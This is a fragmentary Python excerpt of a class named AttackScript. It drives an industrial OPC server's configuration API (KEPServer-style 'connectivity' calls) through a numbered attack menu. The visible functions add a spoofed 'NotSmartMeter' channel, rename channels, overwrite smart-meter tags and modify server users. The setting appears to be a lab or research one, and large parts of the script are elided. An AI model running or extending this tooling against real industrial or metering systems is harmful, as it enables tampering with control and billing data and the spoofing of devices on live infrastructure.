...
class AttackScript:
    ...
    def kep_add_spoofed_channel(self):  ### Added to add spoofed channel
        server = self.kep_connect()
        print(connectivity.channel.add_channel(server, {"common.ALLTYPES_NAME": "NotSmartMeter",
    ...
    def kep_modify_channel(self):  ### Added to modify channel
        server = self.kep_connect()
        print(connectivity.channel.modify_channel(server,
                                                  {"PROJECT_ID": 4064171838, "common.ALLTYPES_NAME": "NotSmartMeter1"},
                                                  channel="NotSmartMeter"))
    ...
    def kep_modify_tag(self, channel,
                       device):  ## ADDED to modify tags ---- NOTE PROJECTID will change everytime so allow user to enter the ID or Copy from get_all_tags function
        server = self.kep_connect()
        device_to_get = ".".join([channel, device])
        print(json.dumps(connectivity.tag.modify_tag(server, "SmartMeter.ministicHACKED.TEST1",
                                                     {"PROJECT_ID": 2330553848, "common.ALLTYPES_NAME": "UPDATEBOI"}),
                         indent=4))
        print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))
    ...
    def main(self):
        ...
        match attack_option:
            ...
            case "28":
                self.kep_add_udd_profile("ABC")
            case "29":
                self.kep_modify_user("Derrick")
            case "30":
